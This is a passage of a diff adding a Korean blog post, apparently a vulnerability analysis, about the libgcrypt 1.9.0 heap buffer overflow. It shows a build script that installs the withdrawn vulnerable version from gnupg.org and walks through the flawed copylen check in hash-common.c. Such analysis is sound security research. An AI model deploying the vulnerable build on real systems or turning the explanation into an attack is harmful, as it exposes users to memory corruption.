class=&quot;n&quot;&gt;bz2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
+&lt;span class=&quot;n&quot;&gt;wget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gnupg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;org&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ftp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gcrypt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pinentry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pinentry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bz2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sig&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
+&lt;span class=&quot;n&quot;&gt;wget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gnupg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;org&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ftp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gcrypt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gnupg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gnupg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;2.2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;27.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bz2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
+&lt;span class=&quot;n&quot;&gt;wget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gnupg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;org&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ftp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gcrypt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gnupg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gnupg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;2.2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;27.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bz2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sig&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
+&lt;span class=&quot;n&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xjf&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libgpg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.41&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bz2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
+&lt;span class=&quot;n&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xjf&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libgcrypt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_do_not_use&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bz2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
+&lt;span class=&quot;n&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xjf&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libassuan&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;2.5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;4.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bz2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
+&lt;span class=&quot;n&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xjf&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libksba&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bz2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
+&lt;span class=&quot;n&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xjf&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;npth&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bz2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
+&lt;span class=&quot;n&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xjf&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pinentry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bz2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
+&lt;span class=&quot;n&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xjf&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gnupg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;2.2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;27.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bz2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
+&lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libgpg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.41&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;configure&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;make&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;make&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
+&lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libgcrypt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;configure&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;make&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;make&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
+&lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libassuan&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;2.5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;configure&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;make&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;make&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
+&lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libksba&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;configure&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;make&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;make&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
+&lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;npth&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;configure&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;make&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;make&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
+&lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pinentry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;configure&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pinentry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curses&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;disable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pinentry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;qt4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
+&lt;span class=&quot;n&quot;&gt;make&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;make&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
+&lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gnupg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;2.2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;27&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;configure&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;make&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;make&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
+&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/usr/local/lib&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;etc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ld&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gpg2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ldconfig&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
+&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Complete!!!&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Libgcrypt 1.9.0의 자동 업데이트 및 기존 스크립트에서의 다운을 방지하기 위해 FTP서버의 파일이름이 &lt;code class=&quot;highlighter-rouge&quot;&gt;libgcrypt-1.9.0_do_not_use&lt;/code&gt;로 변경되어있습니다.&lt;/p&gt;
+
+&lt;p&gt;위 스크립트를 통해 설치 및 업데이트를 진행하고 나면 다음과 같이 &lt;code class=&quot;highlighter-rouge&quot;&gt;gpg --version&lt;/code&gt; 을 통해  취약한 버전이 설치된 것을 확인할 수 있습니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/202103/jae_1.png&quot; alt=&quot;/assets/202103/jae_1.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;취약점-분석&quot;&gt;취약점 분석&lt;/h2&gt;
+
+&lt;p&gt;Libcrypt 1.9.0의 블록 버퍼 관리 코드에서 잘못된 가정으로 인해 &lt;code class=&quot;highlighter-rouge&quot;&gt;힙 버퍼 오버플로우&lt;/code&gt;가 발생하게 됩니다. 공격자는 라이브러리에 특수 제작된 데이터 블록을 전송하여 공격을 유발할 수 있으며, 블럭의 일부 데이터가 단순히 복호화되는 것만으로도 힙 버퍼 오버플로우가 발생합니다.&lt;/p&gt;
+
+&lt;p&gt;libgcrypt의 hash-common.c를 보면 _gcry_md_block_write에서 다음과 같이 블록 버퍼의 점유 공간(&lt;code class=&quot;highlighter-rouge&quot;&gt;hd-&amp;gt;count&lt;/code&gt;)이 블록크기를 초과할 수 없다고 가정합니다.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// libgcrypt/cipher/hash-common.c:150&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;129&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;copylen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;149&lt;/span&gt;	  &lt;span class=&quot;n&quot;&gt;copylen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;150&lt;/span&gt;	  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;copylen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;blocksize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;151&lt;/span&gt;	    &lt;span class=&quot;n&quot;&gt;copylen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;blocksize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;그러나 만약 &lt;code class=&quot;highlighter-rouge&quot;&gt;blocksize&lt;/code&gt;보다 &lt;code class=&quot;highlighter-rouge&quot;&gt;hd-&amp;gt;count&lt;/code&gt;값이 더 크게된다면, 언더플로우가 발생하게 될 것입니다. 이 후, &lt;code class=&quot;highlighter-rouge&quot;&gt;hd-&amp;gt;count&lt;/code&gt; 및 &lt;code class=&quot;highlighter-rouge&quot;&gt;copylen&lt;/code&gt;은 memcpy의 wrapper함수인 buf_cpy로 전달됩니다.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// libgcrypt/cipher/hash-common.c&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;152&lt;/span&gt;		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;copylen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;153&lt;/span&gt;	    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;154&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;155&lt;/span&gt;	  &lt;span class=&quot;nf&quot;&gt;buf_cpy&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;copylen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;156&lt;/span&gt;	  &lt;span class=&quot;n&quot;&gt;hd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;copylen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
